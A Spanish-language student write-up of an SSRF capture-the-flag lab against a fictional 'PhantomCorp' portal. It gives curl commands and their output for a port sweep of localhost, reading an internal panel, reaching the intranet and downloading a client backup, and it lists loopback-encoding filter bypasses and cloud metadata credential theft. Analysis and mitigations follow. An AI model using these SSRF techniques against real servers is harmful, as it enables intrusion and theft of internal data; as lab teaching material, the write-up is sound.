# Entregable — Lab Extra SSRF

**Grupo:** 04 · **Integrantes:** (completar: apellido, nombre — usuario de GitHub)

**Declaración de uso de IA:** Usamos Claude (asistente de IA, Anthropic) durante el laboratorio. Lo usamos para entender la consigna del README, para proponer qué comandos probar en cada reto y para redactar un primer borrador de las respuestas P1 a P5 y de la conclusión. Cada comando y cada salida que aparece en este informe lo ejecutamos nosotros en la consola del laboratorio; las flags y la evidencia son de esa ejecución. Revisamos y reescribimos el borrador de las respuestas con nuestras palabras, y verificamos cada afirmación contra la salida real. [Revisar: el grupo debe confirmar que esto es lo que hizo cada integrante.]

---

## 1. Cadena de explotación

### R1 — Panel interno en localhost

**Estado:** resuelto. Flag entregada en `./ctf submit extra R1` (confirmar resultado de `./ctf status extra`).

**Razonamiento.** La home del portal (`http://phantomcorp/`) tiene un formulario "Previsualizar URL" que envía el parámetro `url` por GET a `/preview`. El servidor hace el pedido a esa URL y devuelve el contenido dentro de su propia página. Eso significa que el pedido sale desde el servidor, no desde la consola atacante.

**Paso 1: relevar el portal.** Desde la consola atacante se guardó la página principal como evidencia:

```bash
curl -s http://phantomcorp/ > /loot/portal.html
```

**Paso 2: comprobar que el servidor hace el pedido por nosotros.** Se usó el propio portal como destino:

```bash
curl -s "http://phantomcorp/preview?url=http://phantomcorp/"
```

La respuesta incluye el HTML del portal precedido por `Previsualizacion de http://phantomcorp/`.

**Paso 3: el oráculo de errores.** Se probó un puerto cerrado en localhost del servidor:

```bash
curl -s "http://phantomcorp/preview?url=http://127.0.0.1:8080/"
```

Respuesta: `No pude traer http://127.0.0.1:8080/: <urlopen error [Errno 111] Connection refused>`. El servidor informa el rechazo de conexión, lo que permite distinguir puertos cerrados de abiertos.

**Paso 4: contraste con un puerto abierto.** Se probó el puerto 80 en localhost:

```bash
curl -s "http://phantomcorp/preview?url=http://127.0.0.1:80/"
```

Respuesta: el HTML del portal, con el encabezado `Previsualizacion de http://127.0.0.1:80/`. Eso confirma que el servidor entrega contenido cuando el puerto responde.

**Paso 5: barrido de puertos.** Primero se recorrió el rango 8000 a 8100 y no hubo ninguna respuesta distinta de `Connection refused`. Después se probó una lista de puertos comunes, con el 80 como control:

```bash
for p in 80 3000 5000 8081 8888 9000 9090 9200 3306 5432 6379 27017 2375 8443; do r=$(curl -s --max-time 3 "http://phantomcorp/preview?url=http://127.0.0.1:$p/"); echo "$p: ${r:0:120}"; done | grep -v "refused"
```

Resultado: aparecieron el 80 (control) y el **9000**, que devolvió contenido. El resto de la lista dio `Connection refused`.

**Paso 6: leer el panel.**

```bash
curl -s "http://phantomcorp/preview?url=http://127.0.0.1:9000/" | tee /loot/panel-9000.html
```

Salida relevante:

```html
<h2>PhantomCorp — Panel interno (solo localhost)</h2>
<p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
```

El archivo quedó guardado en `/loot/panel-9000.html` (en el repo, `.loot/panel-9000.html`).

**Hallazgo.** El panel en `127.0.0.1:9000` solo es accesible desde el servidor. Desde la consola atacante no hay ruta directa, pero el formulario de previsualización permite leerlo a través del servidor.

### R2 — Intranet en la red interna

**Estado:** resuelto. Flag entregada en `./ctf submit extra R2` (confirmar resultado de `./ctf status extra`).

**Razonamiento.** Desde la consola atacante, `phantomcorp-intra` no tiene ruta (la intranet está solo en `internalnet`). El servidor web sí pertenece a las dos redes, así que el mismo mecanismo de `/preview` puede alcanzar la intranet.

**Paso 12: pedirle al servidor que llegue a la intranet.**

```bash
curl -s "http://phantomcorp/preview?url=http://phantomcorp-intra/"
```

Salida relevante:

```html
<h1>Intranet PhantomCorp</h1>
<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
<li><a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a></li>
<li><a href="/salud">estado del servicio</a></li>
```

**Cómo se dedujo el nombre.** El README menciona `phantomcorp-intra` como ejemplo de intranet, y el patrón `phantomcorp-<servicio>` coincide con el host del portal. (Completar con cómo lo dedujo el grupo, si fue por otro camino.)

**Hallazgo.** La intranet no es alcanzable desde la consola atacante, pero sí desde el servidor web. La página indica un backup de clientes accesible desde `/backups/clientes.json`, que corresponde a R3.

### R3 — Exfiltración del backup

**Estado:** resuelto. Flag entregada en `./ctf submit extra R3`.

**Recorrido.** Desde la página de la intranet (paso 12 de R2) se identificó el enlace `/backups/clientes.json`, marcado como "backup de clientes (temporal, borrar!)". Se pidió igual que antes, a través del servidor:

```bash
curl -s "http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json"
```

Salida relevante (datos recortados, sin CUIT completos):

```json
{
  "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
  "clientes": [ { "id": 1, "empresa": "...", "cuit": "30-XXXXXXXX-X" }, "..." ],
  "integridad": "FLAG{ssrf_backup_clientes}"
}
```

**Datos sensibles que acompañaban a la flag.** El archivo contenía registros de clientes con nombre de empresa y CUIT, y un aviso que indica que el backup no debía ser accesible. En el informe se citan solo la cantidad de registros y el tipo de campos, no los valores.

Nota: el backup se pidió desde la consola atacante, a través de `/preview`, porque la intranet no es alcanzable directamente.

## 2. Evidencia de progreso

Pegar la salida de `./ctf status extra` con los 3 retos en ✓. (completar)

## 3. Preguntas de análisis

**P1. ¿Por qué "la intranet no es alcanzable desde afuera" dejó de ser cierto?**

Porque el servidor web (`phantomcorp`) está conectado a dos redes: `labnet`, donde está la consola atacante, y `internalnet`, donde está la intranet. El componente que la hizo alcanzable es la funcionalidad `/preview`: recibe una URL del usuario y el servidor la pide por su cuenta. Desde la consola, `phantomcorp-intra` no resuelve (código 000). Pedida a través de `/preview`, la intranet responde con contenido. La segmentación de red no protege si la aplicación de la zona de borde puede pedir cualquier destino.

**P2. Oráculo de escaneo de puertos.**

En R1 observamos dos respuestas distintas según el puerto: `Connection refused` cuando no hay servicio (8080, y todo el rango 8000–8100) y contenido cuando sí lo hay (80 y 9000). El mensaje de error revela el estado del puerto aunque no veamos el contenido. Eso es un oráculo: el servidor escanea localhost por nosotros y nos informa el resultado. Un atacante puede recorrer una lista de puertos y ver cuáles responden, incluso si el servicio está "escondido" en 127.0.0.1.

**P3. Hallazgo profesional.**

- **Activo afectado:** portal `phantomcorp`, endpoint `/preview`.
- **Vector:** SSRF. El parámetro `url` no se valida ni se restringe a destinos públicos, y el servidor devuelve el contenido de la respuesta.
- **Impacto:** acceso a un panel interno solo accesible desde localhost (con una clave de despliegue), a la intranet no pública y a un backup de clientes marcado como temporal y que no debía ser accesible. Hay exposición de datos de clientes (empresa y CUIT).
- **Evidencia:** las salidas de R1, R2 y R3 en este informe, y los archivos `panel-9000.html` y `portal.html` en `/loot`.
- **Recomendación inicial:** bloquear el endpoint hasta corregir la validación, rotar la clave expuesta y eliminar el backup.

**P4. Tres mitigaciones, de mejor a peor.**

1. **Lista de permitidos (allowlist) de destinos.** El servidor solo pide hosts y esquemas conocidos, por ejemplo un dominio fijo. Es la mejor opción porque no depende de adivinar qué es peligroso. Limitación: obliga a mantener la lista y no sirve si la funcionalidad necesita destinos abiertos.
2. **Validar la IP después de resolver el nombre, y fijarla para el pedido.** El servidor resuelve el dominio, rechaza si la IP es privada o de loopback, y se conecta a esa IP. Limitación: hay que cubrir redirecciones, y puede haber ataques de DNS rebinding si la validación y la conexión usan resoluciones distintas.
3. **Segmentación y reglas de salida (egress) desde el servidor web.** Impedir que el servidor se conecte a la intranet ni a localhost. Limitación: no corrige la aplicación; cualquier otro destino interno permitido sigue expuesto.

**Por qué filtrar strings no alcanza.** Si el filtro bloquea la cadena `localhost` o `127.0.0.1`, siguen funcionando formas equivalentes: `http://127.1/`, `http://2130706433/` (decimal de 127.0.0.1), `http://0x7f000001/`, o un dominio público que resuelve a 127.0.0.1. Un filtro de texto no contempla cómo se interpreta la dirección.

**P5. Metadata service y nube.**

En AWS, GCP o Azure, cada instancia puede pedir a `169.254.169.254` (dirección de enlace local, no ruteable desde internet) sus credenciales temporales del rol asignado. Con un SSRF, el atacante puede pedirlas desde el servidor y usarlas para llamar a la API de la nube. Esto es mucho más grave que en el lab, porque el acceso no termina en un archivo: puede dar control sobre la cuenta. Algunos proveedores exigen un token previo (IMDSv2 en AWS) que un SSRF simple no puede obtener, por eso es una mitigación que vale la pena mencionar.

## 4. Conclusión

Para el CTO de PhantomCorp: el portal de empleados tiene una función de previsualización que hace pedidos desde el servidor a cualquier dirección que el usuario indique. Con eso, cualquier persona con acceso al formulario puede leer un panel que solo debía estar en localhost, descubrir la intranet y descargar un backup de datos de clientes que debía haberse borrado. Recomendamos bloquear la función, validar destinos con una lista de permitidos, rotar la clave expuesta y eliminar el backup, y revisar que no haya otros endpoints con el mismo problema.
